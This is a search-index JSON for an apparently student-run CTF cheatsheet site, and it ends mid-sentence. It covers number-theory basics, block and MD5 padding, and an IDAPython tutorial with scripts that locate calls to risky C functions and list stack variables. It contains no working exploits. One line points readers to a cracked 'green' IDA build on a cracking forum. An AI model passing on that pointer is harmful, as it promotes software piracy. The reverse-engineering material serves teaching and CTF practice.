{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"10.0.0.55 \u6b22\u8fce\u6765\u523010.0.0.55\uff0c\u8fd9\u662f\u4e00\u4e2a\u5317\u4eac\u7406\u5de5\u5927\u5b66\u7684CTF\u6218\u961f\u3002 \u672crepo\u65e8\u5728\u63d0\u4f9b\u4e00\u4e2aCTF\u7684cheatsheet\uff0c\u63d0\u4f9b\u5404\u79cdpayload\uff0c\u7ed5\u8fc7\u59ff\u52bf\u548c\u7ed5\u8fc7\u601d\u8def\uff1b\u5bf9\u6f0f\u6d1e\u8be6\u7ec6\u7684\u8bf4\u660e\u6700\u597d\u4ee5\u5916\u90e8\u94fe\u63a5\u7684\u5f62\u5f0f\u653e\u5728\u5bf9\u5e94\u7684reference\u4e2d\u3002 \u6b22\u8fceissue\u548cpr\u3002","title":"Home"},{"location":"#100055","text":"\u6b22\u8fce\u6765\u523010.0.0.55\uff0c\u8fd9\u662f\u4e00\u4e2a\u5317\u4eac\u7406\u5de5\u5927\u5b66\u7684CTF\u6218\u961f\u3002 \u672crepo\u65e8\u5728\u63d0\u4f9b\u4e00\u4e2aCTF\u7684cheatsheet\uff0c\u63d0\u4f9b\u5404\u79cdpayload\uff0c\u7ed5\u8fc7\u59ff\u52bf\u548c\u7ed5\u8fc7\u601d\u8def\uff1b\u5bf9\u6f0f\u6d1e\u8be6\u7ec6\u7684\u8bf4\u660e\u6700\u597d\u4ee5\u5916\u90e8\u94fe\u63a5\u7684\u5f62\u5f0f\u653e\u5728\u5bf9\u5e94\u7684reference\u4e2d\u3002 \u6b22\u8fceissue\u548cpr\u3002","title":"10.0.0.55"},{"location":"about/","text":"About \u5e08\u5085\u4eec M4x l1b0 \u8c31\u5c3c aloxaf","title":"About"},{"location":"about/#about","text":"","title":"About"},{"location":"about/#_1","text":"M4x l1b0 \u8c31\u5c3c aloxaf","title":"\u5e08\u5085\u4eec"},{"location":"crypto/math/","text":"\u5bc6\u7801\u5b66\u6570\u5b66\u57fa\u7840\u77e5\u8bc6 \u57fa\u672c\u6a21\u8fd0\u7b97 (a+b)\\bmod n = ((a\\bmod n)+(b\\bmod n)) \\bmod n\\\\ (a-b)\\bmod n = ((a\\bmod n)-(b\\bmod n)) \\bmod n\\\\ (a\\times b)\\bmod n = ((a\\bmod n)\\times(b\\bmod n)) \\bmod n (a+b)\\bmod n = ((a\\bmod n)+(b\\bmod n)) \\bmod n\\\\ (a-b)\\bmod n = ((a\\bmod n)-(b\\bmod n)) \\bmod n\\\\ (a\\times b)\\bmod n = ((a\\bmod n)\\times(b\\bmod n)) \\bmod n \u5982\u679c\u6709 a_1\\equiv b_1\\pmod n,a_2\\equiv b_2\\pmod n a_1\\equiv b_1\\pmod n,a_2\\equiv b_2\\pmod n \uff0c \u90a3\u4e48\u5c31\u6709\uff1a $$ a_1+a_2\\equiv b_1+b_2\\pmod n\\\\ a_1-a_2\\equiv b_1-b_2\\pmod n\\\\ a_1\\times a_2\\equiv b_1\\times b_2\\pmod n $$ \u62d3\u5c55GCD (g,s,k)=ex_gcd(a, b) \u5176\u4e2d g=gcd(a,b) \uff0c sa+kb=g \u5f53ab\u4e92\u8d28\u65f6\uff0c g=1 \uff0c\u5b58\u5728 (s,k) \u53ef\u4ee5\u7ebf\u6027\u8868\u51fa sa+kb=1 \u9006\u5143 a a \u5728 \\bmod n \\bmod n \u4e0b\u7684\u9006\u5143\u8bb0\u4e3a a^{-1}\\pmod n a^{-1}\\pmod n \uff0c\u5982\u679c a^{-1}\\pmod n a^{-1}\\pmod n \u4e3a a\\pmod n a\\pmod n \u7684\u9006\u5143\uff0c\u90a3\u4e48\u6709 a\\times a^{-1}\\equiv 1\\pmod n a\\times a^{-1}\\equiv 1\\pmod n . \u5982\u679c\u8981\u6c42 a^{-1}\\pmod n a^{-1}\\pmod n \uff0c\u6709 a\\times a^{-1}\\pmod n a\\times a^{-1}\\pmod n \u8fdb\u4e00\u6b65 a\\times a^{-1}+kn=1 a\\times a^{-1}+kn=1 \uff0c\u6240\u4ee5\u8981\u6c42 a,n a,n \u7ebf\u6027\u8868\u51fa1\uff0c\u8981\u6c42 a,n a,n \u4e92\u8d28\u3002 \u6240\u4ee5\u5b58\u5728 a^{-1}\\pmod n a^{-1}\\pmod n \u7684\u5145\u8981\u6761\u4ef6\u662f gcd(a, n)=1 gcd(a, n)=1 \uff0c\u7136\u540e\u7528\u62d3\u5c55GCD\u7b97\u6cd5\u6c42\u7b97 a^{-1}\\pmod n a^{-1}\\pmod n \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 CRT \u95ee\u9898\uff1a \u6709\u7269\u4e0d\u77e5\u5176\u6570\uff0c\u4e09\u4e09\u6570\u4e4b\u5269\u4e8c\uff0c\u4e94\u4e94\u6570\u4e4b\u5269\u4e09\uff0c\u4e03\u4e03\u6570\u4e4b\u5269\u4e8c\u3002\u95ee\u7269\u51e0\u4f55? \u5f62\u5f0f\u5316\u95ee\u9898\uff1a $$ \\begin{cases} x\\equiv q_1\\pmod {p_1}\\\\ x\\equiv q_2\\pmod {p_2}\\\\ \\dots\\\\ x\\equiv q_n\\pmod {p_n} \\end{cases} $$ \u89e3\u6cd5\uff1a\u5148\u5b9a\u4e49\u4e00\u4e2a w_1=5\\times7\\times[(5\\times7)^{-1}\\pmod {3}] w_1=5\\times7\\times[(5\\times7)^{-1}\\pmod {3}] w_1 w_1 \u6709\u8fd9\u6837\u51e0\u70b9\u6027\u8d28\uff1a $$ w_1\\equiv1\\pmod 3\\\\ w_1\\equiv0\\pmod 5\\\\ w_1\\equiv0\\pmod 7 $$ \u6211\u4eec\u6784\u9020\u7c7b\u4f3c\u7684 w_2,w_3 w_2,w_3 w_2=3\\times7\\times[(3\\times7)^{-1}\\pmod 5] w_2=3\\times7\\times[(3\\times7)^{-1}\\pmod 5] w_3=3\\times5\\times[(3\\times 5)^{-1}\\pmod 7] w_3=3\\times5\\times[(3\\times 5)^{-1}\\pmod 7] \u5c31\u6709 x\\equiv w_1q_1+w_2q_2+w_3q_3\\pmod{p_1p_2p_3} x\\equiv w_1q_1+w_2q_2+w_3q_3\\pmod{p_1p_2p_3} \u6ee1\u8db3x\u7684\u8981\u6c42 \u6211\u4eec\u7ed9\u51fa\u66f4\u5f62\u5f0f\u5316\u7684\u89e3\u9898\u8fc7\u7a0b\uff1a $$ w_k=\\prod_{i\\neq k}p_i[(\\prod_{i\\neq k}p_i)^{-1}\\pmod {p_k}] $$ s_n s_n \u6709\u8fd9\u6837\u7684\u6027\u8d28\uff1a $$ \\begin{cases} s_k\\equiv 1\\pmod {p_k}\\\\ s_k\\equiv 0\\pmod {p_i, i\\neq k} \\end{cases} $$ x\\equiv \\displaystyle \\sum_{k=1}^n\\{q_k\\displaystyle\\prod_{i\\neq k}p_i[(\\displaystyle\\prod_{i\\neq k}p_i)^{-1}\\pmod {p_k}]\\}\\pmod {\\displaystyle\\prod_{i=1}^kp_i} x\\equiv \\displaystyle \\sum_{k=1}^n\\{q_k\\displaystyle\\prod_{i\\neq k}p_i[(\\displaystyle\\prod_{i\\neq k}p_i)^{-1}\\pmod {p_k}]\\}\\pmod {\\displaystyle\\prod_{i=1}^kp_i} \u6b27\u62c9\u5b9a\u7406 \u5982\u679c a a \u4e0e n n \u4e92\u8d28\uff0c\u90a3\u4e48\uff1a $$ a^{\\phi(n)}\\equiv 1\\pmod n $$ \u8d39\u9a6c\u5c0f\u5b9a\u7406 \u6b27\u62c9\u5b9a\u7406\u7684\u7279\u6b8a\u5f62\u5f0f\uff0c \u5f53 n n \u4e3a\u8d28\u6570\u65f6\uff1a $$ a^{n-1}\\equiv1\\pmod n $$","title":"Math"},{"location":"crypto/math/#_1","text":"","title":"\u5bc6\u7801\u5b66\u6570\u5b66\u57fa\u7840\u77e5\u8bc6"},{"location":"crypto/math/#_2","text":"(a+b)\\bmod n = ((a\\bmod n)+(b\\bmod n)) \\bmod n\\\\ (a-b)\\bmod n = ((a\\bmod n)-(b\\bmod n)) \\bmod n\\\\ (a\\times b)\\bmod n = ((a\\bmod n)\\times(b\\bmod n)) \\bmod n (a+b)\\bmod n = ((a\\bmod n)+(b\\bmod n)) \\bmod n\\\\ (a-b)\\bmod n = ((a\\bmod n)-(b\\bmod n)) \\bmod n\\\\ (a\\times b)\\bmod n = ((a\\bmod n)\\times(b\\bmod n)) \\bmod n \u5982\u679c\u6709 a_1\\equiv b_1\\pmod n,a_2\\equiv b_2\\pmod n a_1\\equiv b_1\\pmod n,a_2\\equiv b_2\\pmod n \uff0c \u90a3\u4e48\u5c31\u6709\uff1a $$ a_1+a_2\\equiv b_1+b_2\\pmod n\\\\ a_1-a_2\\equiv b_1-b_2\\pmod n\\\\ a_1\\times a_2\\equiv b_1\\times b_2\\pmod n $$","title":"\u57fa\u672c\u6a21\u8fd0\u7b97"},{"location":"crypto/math/#gcd","text":"(g,s,k)=ex_gcd(a, b) \u5176\u4e2d g=gcd(a,b) \uff0c sa+kb=g \u5f53ab\u4e92\u8d28\u65f6\uff0c g=1 \uff0c\u5b58\u5728 (s,k) \u53ef\u4ee5\u7ebf\u6027\u8868\u51fa sa+kb=1","title":"\u62d3\u5c55GCD"},{"location":"crypto/math/#_3","text":"a a \u5728 \\bmod n \\bmod n \u4e0b\u7684\u9006\u5143\u8bb0\u4e3a a^{-1}\\pmod n a^{-1}\\pmod n \uff0c\u5982\u679c a^{-1}\\pmod n a^{-1}\\pmod n \u4e3a a\\pmod n a\\pmod n \u7684\u9006\u5143\uff0c\u90a3\u4e48\u6709 a\\times a^{-1}\\equiv 1\\pmod n a\\times a^{-1}\\equiv 1\\pmod n . \u5982\u679c\u8981\u6c42 a^{-1}\\pmod n a^{-1}\\pmod n \uff0c\u6709 a\\times a^{-1}\\pmod n a\\times a^{-1}\\pmod n \u8fdb\u4e00\u6b65 a\\times a^{-1}+kn=1 a\\times a^{-1}+kn=1 \uff0c\u6240\u4ee5\u8981\u6c42 a,n a,n \u7ebf\u6027\u8868\u51fa1\uff0c\u8981\u6c42 a,n a,n \u4e92\u8d28\u3002 \u6240\u4ee5\u5b58\u5728 a^{-1}\\pmod n a^{-1}\\pmod n \u7684\u5145\u8981\u6761\u4ef6\u662f gcd(a, n)=1 gcd(a, n)=1 \uff0c\u7136\u540e\u7528\u62d3\u5c55GCD\u7b97\u6cd5\u6c42\u7b97 a^{-1}\\pmod n a^{-1}\\pmod n","title":"\u9006\u5143"},{"location":"crypto/math/#crt","text":"\u95ee\u9898\uff1a \u6709\u7269\u4e0d\u77e5\u5176\u6570\uff0c\u4e09\u4e09\u6570\u4e4b\u5269\u4e8c\uff0c\u4e94\u4e94\u6570\u4e4b\u5269\u4e09\uff0c\u4e03\u4e03\u6570\u4e4b\u5269\u4e8c\u3002\u95ee\u7269\u51e0\u4f55? \u5f62\u5f0f\u5316\u95ee\u9898\uff1a $$ \\begin{cases} x\\equiv q_1\\pmod {p_1}\\\\ x\\equiv q_2\\pmod {p_2}\\\\ \\dots\\\\ x\\equiv q_n\\pmod {p_n} \\end{cases} $$ \u89e3\u6cd5\uff1a\u5148\u5b9a\u4e49\u4e00\u4e2a w_1=5\\times7\\times[(5\\times7)^{-1}\\pmod {3}] w_1=5\\times7\\times[(5\\times7)^{-1}\\pmod {3}] w_1 w_1 \u6709\u8fd9\u6837\u51e0\u70b9\u6027\u8d28\uff1a $$ w_1\\equiv1\\pmod 3\\\\ w_1\\equiv0\\pmod 5\\\\ w_1\\equiv0\\pmod 7 $$ \u6211\u4eec\u6784\u9020\u7c7b\u4f3c\u7684 w_2,w_3 w_2,w_3 w_2=3\\times7\\times[(3\\times7)^{-1}\\pmod 5] w_2=3\\times7\\times[(3\\times7)^{-1}\\pmod 5] w_3=3\\times5\\times[(3\\times 5)^{-1}\\pmod 7] w_3=3\\times5\\times[(3\\times 5)^{-1}\\pmod 7] \u5c31\u6709 x\\equiv w_1q_1+w_2q_2+w_3q_3\\pmod{p_1p_2p_3} x\\equiv w_1q_1+w_2q_2+w_3q_3\\pmod{p_1p_2p_3} \u6ee1\u8db3x\u7684\u8981\u6c42 \u6211\u4eec\u7ed9\u51fa\u66f4\u5f62\u5f0f\u5316\u7684\u89e3\u9898\u8fc7\u7a0b\uff1a $$ w_k=\\prod_{i\\neq k}p_i[(\\prod_{i\\neq k}p_i)^{-1}\\pmod {p_k}] $$ s_n s_n \u6709\u8fd9\u6837\u7684\u6027\u8d28\uff1a $$ \\begin{cases} s_k\\equiv 1\\pmod {p_k}\\\\ s_k\\equiv 0\\pmod {p_i, i\\neq k} \\end{cases} $$ x\\equiv \\displaystyle \\sum_{k=1}^n\\{q_k\\displaystyle\\prod_{i\\neq k}p_i[(\\displaystyle\\prod_{i\\neq k}p_i)^{-1}\\pmod {p_k}]\\}\\pmod {\\displaystyle\\prod_{i=1}^kp_i} x\\equiv \\displaystyle \\sum_{k=1}^n\\{q_k\\displaystyle\\prod_{i\\neq k}p_i[(\\displaystyle\\prod_{i\\neq k}p_i)^{-1}\\pmod {p_k}]\\}\\pmod {\\displaystyle\\prod_{i=1}^kp_i}","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 CRT"},{"location":"crypto/math/#_4","text":"\u5982\u679c a a \u4e0e n n \u4e92\u8d28\uff0c\u90a3\u4e48\uff1a $$ a^{\\phi(n)}\\equiv 1\\pmod n $$","title":"\u6b27\u62c9\u5b9a\u7406"},{"location":"crypto/math/#_5","text":"\u6b27\u62c9\u5b9a\u7406\u7684\u7279\u6b8a\u5f62\u5f0f\uff0c \u5f53 n n \u4e3a\u8d28\u6570\u65f6\uff1a $$ a^{n-1}\\equiv1\\pmod n $$","title":"\u8d39\u9a6c\u5c0f\u5b9a\u7406"},{"location":"crypto/RSA/CopperSmith/","text":"\u5360\u5751","title":"CopperSmith"},{"location":"crypto/block/padding/","text":"Padding\u65b9\u6cd5 pkcs#5/pkcs#7 \u6ce8\u610fpkcs#5\u7684\u5206\u7ec4\u957f\u5ea6\u4e3a8bytes\uff0cpkcs#7\u7684\u5206\u7ec4\u957f\u5ea6\u4e0d\u5b9a aes\u4f7f\u7528\u8fd9\u79cdpadding\u6a21\u5f0f MD5 padding append 1 bit to message append 0 bits until message length in bits \u2261 448 (mod 512) append bit length of message as 64-bit little-endian integer to message 64\u5b57\u8282\u4e00\u5206\u7ec4 \uff08\u5982\u679c\u660e\u6587\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u8ba1\u7b97\u660e\u6587bit\u957f\u5ea6\uff08byte\u957f\u5ea6*8\uff09\uff0c\u8f6c\u5316\u4e3a64\u4f4d\u5c0f\u6bb5\u5e8f\uff0c\u4f5c\u4e3a\u957f\u5ea6\u6807\u8bb0\u3002\u5728\u660e\u6587\u540e\u5148\u8865\u4e0a\u4e00\u4f4d \\x80 \uff0c\u5982\u679c\u672c\u7ec4\u5269\u4f59\u957f\u5ea6\u5c11\u4e8e8\u5219\u518d\u52a0\u4e00\u7ec4\uff0c\u5728\u6700\u540e\u4e00\u7ec4\u7684\u6700\u540e\u628a8bytes\u8bb0\u5f55\u957f\u5ea6\u6807\u8bb0\uff0c\u5269\u4f59\u90e8\u5206\u7528 \\x00 \u586b\u5145","title":"padding"},{"location":"crypto/block/padding/#padding","text":"","title":"Padding\u65b9\u6cd5"},{"location":"crypto/block/padding/#pkcs5pkcs7","text":"\u6ce8\u610fpkcs#5\u7684\u5206\u7ec4\u957f\u5ea6\u4e3a8bytes\uff0cpkcs#7\u7684\u5206\u7ec4\u957f\u5ea6\u4e0d\u5b9a aes\u4f7f\u7528\u8fd9\u79cdpadding\u6a21\u5f0f","title":"pkcs#5/pkcs#7"},{"location":"crypto/block/padding/#md5-padding","text":"append 1 bit to message append 0 bits until message length in bits \u2261 448 (mod 512) append bit length of message as 64-bit little-endian integer to message 64\u5b57\u8282\u4e00\u5206\u7ec4 \uff08\u5982\u679c\u660e\u6587\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u8ba1\u7b97\u660e\u6587bit\u957f\u5ea6\uff08byte\u957f\u5ea6*8\uff09\uff0c\u8f6c\u5316\u4e3a64\u4f4d\u5c0f\u6bb5\u5e8f\uff0c\u4f5c\u4e3a\u957f\u5ea6\u6807\u8bb0\u3002\u5728\u660e\u6587\u540e\u5148\u8865\u4e0a\u4e00\u4f4d \\x80 \uff0c\u5982\u679c\u672c\u7ec4\u5269\u4f59\u957f\u5ea6\u5c11\u4e8e8\u5219\u518d\u52a0\u4e00\u7ec4\uff0c\u5728\u6700\u540e\u4e00\u7ec4\u7684\u6700\u540e\u628a8bytes\u8bb0\u5f55\u957f\u5ea6\u6807\u8bb0\uff0c\u5269\u4f59\u90e8\u5206\u7528 \\x00 \u586b\u5145","title":"MD5 padding"},{"location":"crypto/sign/DSA/","text":"\u5360\u5751","title":"DSA"},{"location":"pwn/IDApython/","text":"IDA \u5f3a\u5927\u7684\u63d2\u4ef6 IDApython idc \u548c IDApython \u5e2e\u52a9\u5206\u6790\u8005\u5229\u7528\u4e0e IDA \u8fdb\u884c\u4ea4\u4e92\uff0c\u5f97\u5230\u81ea\u52a8\u5316\u5206\u6790\u7a0b\u5e8f\u7684\u7ed3\u679c IDApython IDApython \u7684\u5b89\u88c5\u53ef\u4ee5\u5f88\u5bb9\u6613\u5728\u7f51\u4e0a\u67e5\u5230\uff0c\u4f46\u662f\u5bf9\u4e8e IDApython \u6559\u7a0b\u7684\u8d44\u6599\u9664\u4e86\u770b\u5230\u7684\u4e00\u4e2a\u5b98\u65b9\u6587\u6863\u4ee5\u5916\u6ca1\u770b\u5230\u7279\u522b\u591a\u7279\u522b\u597d\u7684\u8d44\u6599\uff0c\u4e8e\u662f\u60f3\u7a0d\u5fae\u8bb0\u5f55\u4e00\u4e0b\u81ea\u5df1\u641e IDApython \u9047\u5230\u7684\u4e00\u4e9b\u5751\u548c IDApython \u5e38\u7528\u7684\u51fd\u6570 (\u5e0c\u671b\u5b66\u5f1f\u548c\u5b66\u59b9\u660e\u5e74\u505a\u7684\u65f6\u5019\u4e0d\u4f1a\u6ca1\u8d44\u6599 =.= \u5b89\u88c5 IDApython \u9996\u5148\u786e\u8ba4\u81ea\u5df1\u7684 IDApython \u662f\u5426\u88c5\u597d\u4e86\uff0c\u6709\u4e24\u79cd\u529e\u6cd5\u3002 \u4e00\u79cd\u4ece IDA \u4e0a\u9762\u7684 File- Script Command \u6253\u5f00\u4e4b\u540e\u770b Scripting language \u662f\u5426\u662f\u5b58\u5728 IDC \u548c Python\uff0c \u7136\u540e\u53ef\u4ee5\u6d4b\u8bd5\u4e00\u4e0b\u5e93\u662f\u5426\u5168\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5229\u7528\u4e00\u4e2a\u5c0f\u811a\u672c\u68c0\u6d4b import \u5e93\u662f\u5426\u4f1a\u62a5\u9519 import idaapi import idc import idautils if __name__ == __main__ : fp = open( Test.txt , w ) fp.write( Success\\n ) fp.close() \u5f53\u7136\u8fd0\u884c\u811a\u672c\u7684\u65f6\u5019\u9700\u8981\u7528 IDA \u6253\u5f00\u4e00\u4e2a\u968f\u4fbf\u7684\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884c\u5b8c\u811a\u672c\u53ef\u4ee5\u5728\u90a3\u4e2a\u6587\u4ef6\u7684\u90a3\u4e00\u5c42\u91cc\u9762\u591a\u51fa\u6765\u4e00\u4e2a Test.txt \u6587\u4ef6\uff0c\u91cc\u9762\u5199\u7740 Success \u5c31\u8bf4\u660e\u6ca1\u95ee\u9898\uff0c\u5426\u5219\u5e93\u5c31\u662f\u6ca1\u88c5\u5168 \u53e6\u5916\u4e00\u79cd\u529e\u6cd5\u5c31\u662f\u5728 IDA \u6700\u4e0b\u9762\u6709\u4e00\u4e2a Output window \u4e0b\u9762\u6709\u4e00\u4e2a\u53ef\u9009\u7684\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728 IDC \u548c Python\uff0c\u5728\u91cc\u9762\u9009 Python \u7136\u540e\u5c1d\u8bd5 import \u4e09\u4e2a\u5e93\u5c31\u53ef\u4ee5\u4e86\uff0c\u6ca1\u62a5\u9519\u5c31\u6ca1\u95ee\u9898\u3002 import \u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5e93\u8bd5\u4e00\u4e0b import requests \u5c31\u4f1a\u53d1\u73b0\u62a5\u9519 (\u5982\u679c\u6ca1\u5b89\u88c5\u597d\uff0c\u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u543e\u7231\u7834\u89e3 IDA 7.0 \u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u5df2\u7ecf\u7eff\u8272\u7248+\u914d\u597d Python \u7684 IDA \u4e00\u4e9b\u811a\u672c \u4e0b\u9762\u662f\u6211\u770b\u5230\u7684\u4e00\u4e9b\u811a\u672c\uff0c\u6211\u62ff\u5230\u672c\u5730\u6d4b\u8bd5\u8fc7\u80fd\u8dd1\u7684 example 01 \u6253\u5370\u5168\u90e8\u51fd\u6570\u7684\u540d\u5b57 # -*- coding: utf-8 -*- from idaapi import * from idautils import * import idc idc.Wait() # \u5355\u7ebf\u7a0b\u7684\u611f\u89c9\uff0c\u5206\u6790\u5b8c\u4e00\u4e2a\u4e4b\u540e\u624d\u4f1a\u8fd0\u884c\u540e\u7eed\u811a\u672c ea = BeginEA() # \u627e\u5230\u7a0b\u5e8f _start (\u9488\u5bf9 ELF \u800c\u8a00)\u3000\u8fd4\u56de\u662f type long fp = open( Z:\\\\home\\\\vangelis\\\\Desktop\\\\rop_fun_output.txt , w ) fp.write( check\\n ) idx = 0 # \u5728.text\u6bb5\u4e2d SegStart() \u627e\u5230\u7a0b\u5e8f\u5730\u5740\u6700\u5c0f\u7684\u6c47\u7f16\u6307\u4ee4\u7684\u5730\u5740\uff0cSegEnd() \u627e\u5230\u7a0b\u5e8f\u5730\u5740\u6700\u5927\u7684\u6c47\u7f16\u6307\u4ee4\u7684\u5730\u5740 for funcea in Functions(SegStart(ea), SegEnd(ea)): # Functions() \u8fd4\u56de\u4e3a type generator functionName = GetFunctionName(funcea) # funcea \u7c7b\u578b\u4e3a\u3000 type long \u4e3a\u5730\u5740 GetFunctionName() \u5c06\u5730\u5740\u8f6c\u6362\u4e3a\u51fd\u6570\u540d fp.write( %d % idx) fp.write(functionName + \\n ) idx += 1 fp.close() idc.Exit(0) # \u5728\u811a\u672c\u8fd0\u884c\u7ed3\u675f\u4e4b\u540e\u80fd\u591f\u81ea\u52a8\u5173\u95ed IDA idc Wait() Wait(): $ grep -H Wait ./*.py ./idc_bc695.py:def Wait(): return auto_wait() idc.py 412 \u2502 def auto_wait(): 413 \u2502 414 \u2502 Process all entries in the autoanalysis queue 415 \u2502 Wait for the end of autoanalysis 416 \u2502 417 \u2502 @note: This function will suspend execution of the calling script 418 \u2502 till the autoanalysis queue is empty. 419 \u2502 420 \u2502 return ida_auto.auto_wait() \u5728 IDA \u6587\u4ef6\u91cc\u9762\u7528 powershell \u6253\u5f00\uff0c\u8fd0\u884c .\\ida.exe -c -S\"test.py\" input_file \u5373\u53ef\uff0c -c -S \u662f\u4e24\u4e2a\u53c2\u6570\uff0c \u7136\u540e\u6211\u795e\u7ecf\u5200\uff0c\u8dd1\u5230 linux \u91cc\u9762\u6765\u8bd5\u884c\u4e0d\u884c\uff0c\u6211\u7684 IDA \u653e\u5728 ~/ \u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u8fd0\u884c\u811a\u672c\u7684\u65f6\u5019\u5f00\u59cb\u62a5\u9519\uff0c\u540e\u6765\u89c9\u5f97\u662f\u56e0\u4e3a\u7528\u7684 wine \u8c03\u7528\u7684 ida.exe \u6240\u4ee5\u5728 -S \u91cc\u9762\u8fd8\u662f\u8981\u7528 windows \u4e0b\u53cd\u659c\u6760\u800c\u4e0d\u662f\u659c\u6760 # vangelis @ vangelis-PC in ~/IDA [22:47:42] C:2 $ ./ida.exe -c -S .\\Vangelis\\test.py ~/Desktop/Analysis_File/rop/rop \u540c\u65f6\u5728\u811a\u672c\u91cc\u9762\u4e5f\u662f\u8981\u7528\u6620\u5c04\u8fc7\u53bb\u7684\u5730\u5740\uff0c\u6240\u4ee5\u7528\u7684 Z:\\\\home\\\\vangelis\\\\Desktop\\\\rop_fun_output.txt \u540e\u6765\u518d\u6539\u8fdb\u4e00\u4e0b\uff0c\u53d8\u6210\u4e86 nohup ./ida.exe -c -S\".\\Vangelis\\test.py\" ~/Desktop/Analysis_File/rop/rop outfile 2 1 \u628a\u6807\u51c6\u8f93\u51fa\u548c\u9519\u8bef\u5168\u90e8\u8f93\u51fa\u5230 outfile \u6587\u4ef6\u4e2d \u518d\u540e\u6765\u89c9\u5f97\u6bcf\u6b21\u5f00 IDA \u5341\u5206\u4e0d\u8212\u670d\u5c31\u67e5\u4e86\u4e00\u4e0b\u8fd0\u884c IDA \u7684\u53c2\u6570\uff0c\u6700\u540e\u7528\u7684 -B -S -B batch mode. IDA will generate .IDB and .ASM files automatically \u56e0\u4e3a\u6700\u540e\u4f1a\u4ea7\u751f\u76f8\u5e94\u7684 .idb \u6216\u8005 .asm \u6240\u4ee5\u6700\u540e\u5904\u7406\u4e00\u4e0b\uff0c\u4e0d\u5904\u7406\u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48 example 02 \u5bfb\u627e\u5371\u9669\u51fd\u6570\u7684\u88ab\u5f15\u7528\u7684\u5730\u5740 # -*- coding: utf-8 -*- from idaapi import * from idautils import * import idc idc.Wait() danger_funcs = [ strcpy , read , gets ] fp = open( Z:\\\\home\\\\vangelis\\\\Desktop\\\\Analysis_File\\\\rop\\\\rop_danger_call.txt , w ) fp.write( check\\n ) for func in danger_funcs : fp.write( #############\\n ) fp.write(func + \\n ) addr = LocByName(func) if addr != BADADDR: cross_regs = CodeRefsTo(addr, 0) for ref in cross_regs: fp.write(str(hex(ref)) + \\n ) fp.close() idc.Exit(0) idc LocByName \u7ecf\u8fc7\u5c1d\u8bd5 LocByName \u51fd\u6570\u5b58\u5728\u5219\u8fd4\u56de\u51fd\u6570\u5730\u5740\uff0c\u5426\u5219\u8fd4\u56de 0xffffffff (32\u4f4d) \u800c BADADDR \u5c31\u662f 0xffffffff (32\u4f4d) Python hex(BADADDR) 0xffffffffL Python hex(LocByName( ABCD )) 0xffffffffL $ grep -H LocByName ./*.py ./idc_bc695.py:def LocByName(name): return get_name_ea_simple(name) $ grep -H get_name_ea_simple ./*.py ./idc.py:def get_name_ea_simple(name): 1879 \u2502 def get_name_ea_simple(name): 1880 \u2502 1881 \u2502 Get linear address of a name 1882 \u2502 1883 \u2502 @param name: name of program byte 1884 \u2502 1885 \u2502 @return: address of the name 1886 \u2502 BADADDR - No such name 1887 \u2502 1888 \u2502 return ida_name.get_name_ea(BADADDR, name) 72 \u2502 __EA64__ = ida_idaapi.BADADDR == 0xFFFFFFFFFFFFFFFFL 73 \u2502 WORDMASK = 0xFFFFFFFFFFFFFFFF if __EA64__ else 0xFFFFFFFF idatils CodeRefsTo \u627e\u5230 to \u8be5\u5730\u5740\u7684\u4e00\u4e2a\u5217\u8868 Python CodeRefsTo(0x806d290L, 0) generator object refs at 0x000000000C26B2D0 68 \u2502 def CodeRefsFrom(ea, flow): 69 \u2502 70 \u2502 Get a list of code references from ea 71 \u2502 72 \u2502 @param ea: Target address 73 \u2502 @param flow: Follow normal code flow or not 74 \u2502 @type flow: Boolean (0/1, False/True) 75 \u2502 76 \u2502 @return: list of references (may be empty list) 77 \u2502 78 \u2502 Example:: 79 \u2502 80 \u2502 for ref in CodeRefsFrom(get_screen_ea(), 1): 81 \u2502 print ref 82 \u2502 83 \u2502 if flow == 1: 84 \u2502 return refs(ea, ida_xref.get_first_cref_from, ida_xref.get_next_cref_from) 85 \u2502 else: 86 \u2502 return refs(ea, ida_xref.get_first_fcref_from, ida_xref.get_next_fcref_from) example 03 \u6253\u5370\u51fd\u6570\u6808\u4e2d\u7684\u5c40\u90e8\u53d8\u91cf from idaapi import * from idautils import * import idc import types if __name__ == __main__ : idc.Wait() fp = open( Z:\\\\home\\\\vangelis\\\\Desktop\\\\Analysis_File\\\\rop\\\\stack-member.txt , w ) fp.write( check\\n ) ea = BeginEA() for func in Functions(SegStart(ea), SegEnd(ea)): funcName = GetFunctionName(func) # if(funcName != overflow ): # continue fp.write( ###############\\n ) fp.write( Function Name is %s\\n % funcName) stack_frame = GetFrame(func) frame_size = GetStrucSize(stack_frame) fp.write( frame_size: %d\\n % frame_size) frame_counter = 0 while frame_counter frame_size: stack_var = GetMemberName(stack_frame, frame_counter) if type(stack_var) == type( a ): fp.write( [*] Function:%s - Stack Variable:%s(%d bytes)\\n % (funcName, stack_var, GetMemberSize(stack_frame, frame_counter))) try : frame_counter = frame_counter + GetMemberSize(stack_frame, frame_counter) except: frame_counter += 1 else : frame_counter += 1 fp.close() idc.Exit(0) \u6ce8\uff1a stack frame \u662f\u4ece\u67d0\u4e00\u51fd\u6570\u7684 \u53c2\u6570\u5230\u6808\u9876 \u4e4b\u95f4\u5168\u90e8\u5185\u5bb9 idc GetMemberName \u901a\u8fc7 stack id \u548c offset \u5f97\u5230\u53d8\u91cf\u7684\u540d\u5b57 Python stack = GetFrame(0x804887c) # overflow function s address Python hex(stack) 0xff00006cL Python GetMemberName(stack, 0xc) var_C $ grep -H GetMemberName ./*.py ./idc_bc695.py:def GetMemberName(id, member_offset): return get_member_name(id, member_offset) 5092 \u2502 def get_member_name(sid, member_offset): 5093 \u2502 5094 \u2502 Get name of a member of a structure 5095 \u2502 5096 \u2502 @param sid: structure type ID 5097 \u2502 @param member_offset: member offset. The offset can be 5098 \u2502 any offset in the member. For example, 5099 \u2502 is a 